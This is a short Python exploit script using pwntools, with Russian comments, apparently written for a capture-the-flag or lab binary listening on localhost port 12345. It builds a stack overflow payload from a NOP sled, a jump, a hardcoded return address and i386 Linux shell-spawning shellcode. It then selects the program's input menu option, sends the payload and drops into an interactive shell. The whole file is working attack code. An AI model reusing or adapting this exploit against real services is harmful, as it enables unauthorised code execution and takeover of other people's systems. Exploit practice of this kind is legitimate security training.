import pwn
import sys

# Создаем полезную нагрузку
payload = b'\x90' * 26
payload += b'\xeb\x04'
# payload += pwn.p32(0x0804a0c1)

payload += pwn.p32(0x0804a7ca)
payload += pwn.asm(pwn.shellcraft.i386.linux.sh())
# Открываем соединение с удаленным сервером
p = pwn.remote('localhost', 12345)

# Преодолеваем главное меню
p.sendline(b'3')  # Отправляем "3", чтобы выбрать "Ввод данных"

# # Считываем ответ от программы, чтобы перейти к запросу ввода
p.recvuntil(b"Enter input:")

# Отправляем полезную нагрузку
p.sendline(payload)

# Запускаем интерактивный режим для дальнейшего взаимодействия
p.interactive()
